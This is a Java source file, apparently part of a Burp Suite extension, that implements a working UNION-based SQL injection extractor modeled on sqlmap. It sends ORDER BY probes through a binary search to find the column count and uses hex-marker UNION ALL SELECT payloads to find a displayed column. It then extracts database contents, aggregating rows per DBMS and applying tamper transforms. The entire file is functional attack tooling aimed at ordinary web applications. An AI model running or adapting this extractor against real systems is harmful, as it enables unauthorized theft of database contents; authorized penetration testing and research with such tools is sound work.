package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * UNION-based SQL injection extractor — the fastest technique.
 * Extracts entire rows per request using UNION SELECT.
 *
 * Phases:
 * 1. Detect column count via ORDER BY binary search
 * 2. Find displayable column via UNION SELECT with markers
 * 3. Extract data via UNION SELECT with subqueries
 */
public class UnionExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    private int columnCount = -1;
    private int displayColumn = -1;
    private String baselineBody = "";
    private final ResponseAnalyzer analyzer = new ResponseAnalyzer();

    /** The boundary (prefix/suffix) that works for UNION-based extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    public UnionExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Test if UNION-based injection works by trying ALL boundaries.
     * For each boundary: detect column count via ORDER BY, then find display column.
     * Like sqlmap: different boundaries may be needed for UNION vs boolean.
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if UNION injection is viable
     */
    public boolean detect(List<String[]> boundaries) {
        // Expand boundaries: for each boundary with non-empty suffix, also try without suffix.
        // UNION SELECT payloads are self-contained — the DBMS processes the UNION before
        // hitting any trailing syntax issue. Trying without suffix doubles detection coverage.
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        callback.onProgress("UNION: Detecting column count (" + expandedBoundaries.size() + " boundaries)...", 5);

        // Get baseline response once (same for all boundaries)
        var baseResp = sendOriginalRequest();
        if (baseResp == null) return false;
        baselineBody = baseResp.bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Try each boundary independently
        for (String[] boundary : expandedBoundaries) {
            if (cancelled) return false;

            String prefix = boundary[0];
            String suffix = boundary[1];

            // Phase 1: Binary search for column count via ORDER BY
            int cols = detectColumnCountWith(prefix, suffix);
            if (cols <= 0) continue;

            callback.onProgress("UNION: Found " + cols + " columns with prefix=\"" + prefix +
                    "\" suffix=\"" + suffix + "\". Finding display column...", 10);

            // Phase 2: Find which column is displayed in the response
            int dispCol = findDisplayColumnWith(prefix, suffix, cols);
            if (dispCol < 0) continue;

            // Success! Store this boundary
            columnCount = cols;
            displayColumn = dispCol;
            workingPrefix = prefix;
            workingSuffix = suffix;
            callback.onProgress("UNION: Display column " + (displayColumn + 1) + " of " +
                    columnCount + " (prefix=\"" + prefix + "\" suffix=\"" + suffix + "\")", 15);
            return true;
        }

        callback.onProgress("UNION: No working boundary found for UNION injection", 0);
        return false;
    }

    /**
     * Extract data using UNION ALL SELECT (like sqlmap).
     * Uses NEGATIVE WHERE mode: replaces original parameter value with a non-matching value
     * so the original query returns 0 rows, and only the UNION SELECT result appears.
     * Like sqlmap's WHERE.NEGATIVE mode for UNION extraction.
     *
     * The query result is placed in the displayable column, wrapped in hex-encoded
     * markers. Non-display columns use NULL (not numeric values).
     */
    public String extractSingle(String query) {
        if (cancelled || columnCount <= 0 || displayColumn < 0) return null;

        // Generate random hex markers like sqlmap (e.g., 0x716b7871...data...0x7170787871)
        String startHex = randomHex(4);
        String endHex = randomHex(5);
        String startMarker = decodeHex(startHex);
        String endMarker = decodeHex(endHex);

        // Convert hex markers to DBMS-appropriate expressions
        String startExpr = hexToDbmsExpr(startHex);
        String endExpr = hexToDbmsExpr(endHex);

        // Build UNION ALL SELECT: NULL for non-display columns, hex markers around data
        StringBuilder unionCols = new StringBuilder();
        for (int i = 0; i < columnCount; i++) {
            if (i > 0) unionCols.append(",");
            if (i == displayColumn) {
                unionCols.append(dialect.concatenate(startExpr,
                        "(" + query + ")", endExpr));
            } else {
                unionCols.append("NULL");
            }
        }

        // Oracle requires FROM DUAL for bare SELECT statements
        String payload = " UNION ALL SELECT " + unionCols + dialect.unionFrom() + " ";
        payload = applyTamper(payload);

        // Use NEGATIVE WHERE mode: replace original value with negative prefix + payload
        // This ensures the original query returns 0 rows, so only UNION data appears
        var response = sendPayloadNegative(payload);
        if (response == null || cancelled) return null;

        String body = response.bodyToString();
        if (body == null) return null;

        // Extract data between decoded hex markers
        int start = body.indexOf(startMarker);
        if (start < 0) return null;
        start += startMarker.length();

        int end = body.indexOf(endMarker, start);
        if (end < 0) return null;

        return body.substring(start, end);
    }

    /**
     * Extract a list of values (e.g., database names, table names).
     * Like sqlmap: tries aggregation first (all values in one request), then row-by-row fallback.
     *
     * sqlmap uses JSON aggregation per DBMS:
     * - MySQL: GROUP_CONCAT(col SEPARATOR '|')
     * - PostgreSQL: STRING_AGG(col::text, '|')
     * - MSSQL: does not use aggregation here (FOR JSON AUTO is different)
     * - Oracle: LISTAGG(col, '|') WITHIN GROUP (ORDER BY col) — Oracle 11g+
     * - SQLite: GROUP_CONCAT(col, '|')
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // Parse query to separate column expression from FROM clause
        java.util.regex.Matcher gcm = java.util.regex.Pattern.compile(
                "(?i)^SELECT\\s+(.+?)\\s+FROM\\s+(.+)$").matcher(query);

        if (gcm.matches()) {
            String col = gcm.group(1);
            String fromClause = gcm.group(2);
            String aggQuery = null;
            String dbms = dialect.getName();

            if ("MySQL".equals(dbms)) {
                // sqlmap: GROUP_CONCAT(col SEPARATOR 0x7c)
                aggQuery = "SELECT GROUP_CONCAT(" + col + " SEPARATOR 0x7c) FROM " + fromClause;
            } else if ("PostgreSQL".equals(dbms)) {
                // sqlmap: STRING_AGG(col::text, '|')
                aggQuery = "SELECT STRING_AGG(CAST(" + col + " AS TEXT),CHR(124)) FROM " + fromClause;
            } else if ("Oracle".equals(dbms)) {
                // sqlmap: LISTAGG(col, '|') WITHIN GROUP (ORDER BY col)
                aggQuery = "SELECT LISTAGG(" + col + ",CHR(124)) WITHIN GROUP (ORDER BY " + col + ") FROM " + fromClause;
            } else if ("SQLite".equals(dbms)) {
                // sqlmap: GROUP_CONCAT(col, '|')
                aggQuery = "SELECT GROUP_CONCAT(" + col + ",CHAR(124)) FROM " + fromClause;
            }

            if (aggQuery != null) {
                String grouped = extractSingle(aggQuery);
                if (grouped != null && !grouped.isEmpty()) {
                    Set<String> seen = new HashSet<>();
                    for (String val : grouped.split("\\|")) {
                        String trimmed = val.trim();
                        if (!trimmed.isEmpty() && seen.add(trimmed)) {
                            results.add(trimmed);
                        }
                    }
                    if (!results.isEmpty()) return results;
                }
            }
        }

        // Fallback: extract row by row using dialect-aware pagination with dedup
        Set<String> seen = new HashSet<>();
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            String trimmed = val.trim();
            if (seen.add(trimmed)) {
                results.add(trimmed);
            }
        }

        return results;
    }

    /**
     * Detect column count using ORDER BY binary search with a specific boundary.
     * Uses RELATIVE comparison (ORDER BY 1 vs ORDER BY 999) instead of an absolute
     * similarity threshold, so it works even with dynamic page content.
     */
    private int detectColumnCountWith(String prefix, String suffix) {
        // Level-gated max column count (matches sqlmap behavior)
        int maxColumns = switch (config.getLevel()) {
            case 1 -> 10;
            case 2 -> 20;
            case 3 -> 30;
            case 4 -> 40;
            default -> 50;
        };

        // Get ORDER BY success baseline (ORDER BY 1 — always valid if injectable)
        String ob1Payload = applyTamper(" ORDER BY 1 ");
        var ob1Resp = sendPayloadWith(ob1Payload, prefix, suffix);
        if (ob1Resp == null) return -1;
        String successBody = ob1Resp.bodyToString();
        if (successBody == null) return -1;

        // Get ORDER BY failure baseline (ORDER BY 999 — almost certainly invalid)
        String ob999Payload = applyTamper(" ORDER BY 999 ");
        var ob999Resp = sendPayloadWith(ob999Payload, prefix, suffix);
        if (ob999Resp == null) return -1;
        String failBody = ob999Resp.bodyToString();
        if (failBody == null) return -1;

        // Check if success and failure look different (can we tell them apart?)
        boolean hasErrorKeywords = failBody.contains("Unknown column")
                || failBody.contains("ORDER BY position")
                || failBody.contains("order clause")
                || failBody.contains("does not exist");
        double baselineSim = analyzer.similarity(successBody, failBody);
        int lenDiff = Math.abs(successBody.length() - failBody.length());

        if (baselineSim > 0.98 && !hasErrorKeywords && lenDiff < 20) {
            // Can't distinguish success from failure with this boundary
            return -1;
        }

        // Binary search: find the max N where ORDER BY N succeeds
        int low = 1, high = maxColumns;
        int found = -1;

        while (low <= high && !cancelled) {
            int mid = (low + high) / 2;
            String payload = applyTamper(" ORDER BY " + mid + " ");
            var resp = sendPayloadWith(payload, prefix, suffix);
            if (resp == null) break;
            String body = resp.bodyToString();

            if (isOrderBySuccessRelative(body, successBody, failBody)) {
                found = mid;
                low = mid + 1;
            } else {
                high = mid - 1;
            }
        }

        return found;
    }

    /**
     * Find which column index displays data with a specific boundary.
     * Like sqlmap: uses UNION ALL SELECT with NULL columns and hex-encoded
     * markers in each position to identify the displayable column.
     */
    private int findDisplayColumnWith(String prefix, String suffix, int cols) {
        for (int col = 0; col < cols && !cancelled; col++) {
            String markerHex = randomHex(4);
            String markerDecoded = decodeHex(markerHex);
            // Convert hex to DBMS-appropriate expression (MySQL: 0x..., others: CHR()||CHR()...)
            String markerExpr = hexToDbmsExpr(markerHex);

            StringBuilder selectCols = new StringBuilder();
            for (int i = 0; i < cols; i++) {
                if (i > 0) selectCols.append(",");
                if (i == col) {
                    selectCols.append(markerExpr);
                } else {
                    selectCols.append("NULL");
                }
            }

            // Oracle requires FROM DUAL for bare SELECT statements
            String payload = " UNION ALL SELECT " + selectCols + dialect.unionFrom() + " ";
            payload = applyTamper(payload);

            var resp = sendPayloadWith(payload, prefix, suffix);
            if (resp == null) continue;
            String body = resp.bodyToString();
            if (body != null && body.contains(markerDecoded)) {
                return col;
            }
        }

        return -1;
    }

    /**
     * Check if an ORDER BY response indicates success using RELATIVE comparison.
     * Compares response against both known-success (ORDER BY 1) and known-failure
     * (ORDER BY 999) baselines. This handles dynamic content that would break
     * an absolute threshold (which boolean blind gets right but UNION was failing).
     */
    private boolean isOrderBySuccessRelative(String body, String successBody, String failBody) {
        if (body == null) return false;

        // Hard error keywords = definitely failure
        if (body.contains("Unknown column") || body.contains("ORDER BY position")
                || body.contains("order clause") || body.contains("does not exist")) {
            return false;
        }

        // Relative comparison: is this response closer to success or failure?
        double simToSuccess = analyzer.similarity(successBody, body);
        double simToFailure = analyzer.similarity(failBody, body);

        return simToSuccess > simToFailure;
    }

    /**
     * Send original request (no injection) for baseline measurement.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendOriginalRequest() {
        try {
            HttpRequestResponse rr = api.http().sendRequest(originalRequest.request());
            result.incrementRequestCount();
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a request with the payload using the stored working boundary.
     * Used during detection phase (ORDER BY, display column detection).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        return sendPayloadWith(payload, workingPrefix, workingSuffix);
    }

    /**
     * Send a request using NEGATIVE WHERE mode (like sqlmap's WHERE.NEGATIVE).
     * Replaces the original parameter value entirely with a non-matching negative value
     * plus the UNION payload. This ensures the original query returns 0 rows,
     * so only the UNION SELECT result appears in the response.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadNegative(String payload) {
        try {
            // Build full payload: negative value + boundary prefix + UNION payload + boundary suffix
            // -1 is used as the negative value (guaranteed to not match any typical ID)
            String fullPayload = "-1" + workingPrefix + payload + (workingSuffix.isEmpty() ? "" : workingSuffix);
            HttpRequest req = PayloadInjector.injectReplace(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), fullPayload);
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "UNION", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send a request with the payload using a specific boundary.
     * Used during detection phase to try different prefix/suffix combinations.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadWith(
            String payload, String prefix, String suffix) {
        try {
            String fullPayload = prefix + payload + (suffix.isEmpty() ? "" : suffix);
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), fullPayload);
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "UNION", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    private String applyTamper(String payload) {
        return TamperEngine.apply(payload, config.getTampers());
    }

    /**
     * Generate a random hex string like sqlmap's kb.chars markers.
     * Uses printable ASCII chars in the 0x71-0x78 range.
     */
    private static String randomHex(int byteCount) {
        StringBuilder sb = new StringBuilder("0x");
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        for (int i = 0; i < byteCount; i++) {
            sb.append(String.format("%02x", rng.nextInt(0x71, 0x79)));
        }
        return sb.toString();
    }

    /**
     * Decode a hex string (0x7172...) to its ASCII string representation.
     */
    private static String decodeHex(String hex) {
        String raw = hex.startsWith("0x") ? hex.substring(2) : hex;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < raw.length(); i += 2) {
            sb.append((char) Integer.parseInt(raw.substring(i, i + 2), 16));
        }
        return sb.toString();
    }

    /**
     * Convert a hex marker string to DBMS-appropriate SQL expression.
     * CRITICAL: MySQL supports 0x hex literals as strings, but other DBMS don't.
     * - MySQL:      0x717871 (native hex literal → treated as string)
     * - PostgreSQL:  CHR(113)||CHR(120)||CHR(113)
     * - Oracle:      CHR(113)||CHR(120)||CHR(113)
     * - MSSQL:       CHAR(113)+CHAR(120)+CHAR(113)
     * - SQLite:      CHAR(113)||CHAR(120)||CHAR(113)
     * Like sqlmap: uses dialect-specific char functions for non-MySQL DBMS.
     */
    private String hexToDbmsExpr(String hex) {
        if ("MySQL".equals(dialect.getName())) {
            return hex; // MySQL natively interprets 0x hex literals as strings
        }
        // For all other DBMS: convert hex bytes to CHR()/CHAR() concatenation
        String raw = hex.startsWith("0x") ? hex.substring(2) : hex;
        String[] chrParts = new String[raw.length() / 2];
        for (int i = 0; i < raw.length(); i += 2) {
            int ascii = Integer.parseInt(raw.substring(i, i + 2), 16);
            chrParts[i / 2] = dialect.charFunction(ascii);
        }
        return dialect.concatenate(chrParts);
    }

    public int getColumnCount() { return columnCount; }
    public int getDisplayColumn() { return displayColumn; }
}
